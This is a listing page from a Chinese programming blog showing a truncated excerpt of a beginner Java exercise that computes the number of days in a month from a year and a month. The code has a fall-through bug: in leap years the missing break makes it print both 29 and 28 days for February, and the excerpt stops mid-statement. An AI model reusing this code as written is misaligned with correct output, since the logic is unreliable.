package prj1006; import java.util.Scanner; public class Test06 { public static void main(String[] args) { Scanner sc = new Scanner(System.in); //创建键盘录入对象 System.out.println("请输入年份:"); int year=sc.nextInt(); //接收年 System.out.println("请输入月份:"); int month=sc.nextInt(); //接受月 switch(year%4){ //判断是否为闰年的条件 case 0: if (year%100!=0 || year%400==0) //判断是否为闰年的条件 { switch(month) { //闰年时对比月份 case 1,3,5,7,8,10,12: System.out.println(year+"年"+month+"月"+"有31天"); break; case 2: System.out.println(year+"年"+month+"月"+"有29天"); break; case 4,6,9,11: System.out.println(year+"年"+month+"月"+"有30天"); break; } } default : switch(month) { //不是闰年时对比月份 case 1,3,5,7,8,10,12: System.out.println(year+"年"+month+"月"+"有31天"); break; case 2: System.out.println(year+"年"+month+"月"+"有28天"); break; case 4,6,9,11: System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc9b481d0ce15dfca39524118a9bdaf2/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/181/">«</a>
	<span class="pagination__item pagination__item--current">182/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/183/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>